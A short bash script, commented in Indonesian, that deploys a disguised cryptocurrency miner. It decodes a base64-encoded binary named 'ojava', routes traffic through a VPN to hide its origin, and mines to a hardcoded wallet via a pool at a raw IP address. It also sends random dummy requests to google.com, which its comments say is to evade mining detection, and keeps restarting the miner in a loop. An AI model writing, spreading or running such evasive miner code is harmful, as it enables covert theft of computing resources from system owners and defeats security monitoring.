#!/bin/bash

# Set default environment variables atau generate acak
WORKER_ID=${WORKER_ID:-$(shuf -i 1-99 -n 1)}  # ID unik per worker
WALLET_ADDRESS=${WALLET_ADDRESS:-"AxK8nDr6es3jnCuDNUCWvY2yHkrvYM2mD52oKzqRZVsW"}
POOL_URL=${POOL_URL:-"31.171.240.178:80"}

# Gunakan VPN atau proxy untuk menyembunyikan IP
openvpn --config /path/to/vpn-config.ovpn &  # VPN untuk anonimitas
sleep 10  # Tunggu sampai VPN tersambung

# Enkripsi dan decode ojava
base64 -d /ojava.enc > /ojava
chmod +x /ojava

# Log dummy request untuk menghindari pola deteksi mining
while true; do
    curl -s https://google.com > /dev/null  # Request dummy
    sleep $((RANDOM % 300 + 100))  # Tidur acak untuk menghindari deteksi pola
done &

# Menjalankan mining
./ojava --url $POOL_URL/mine mine --username $WALLET_ADDRESS.$WORKER_ID --cores 4 &>/dev/null

# Restart miner jika proses mati
while true; do
    pgrep ojava > /dev/null || ./ojava --url $POOL_URL/mine mine --username $WALLET_ADDRESS.$WORKER_ID --cores 4 &>/dev/null
    sleep 60
done
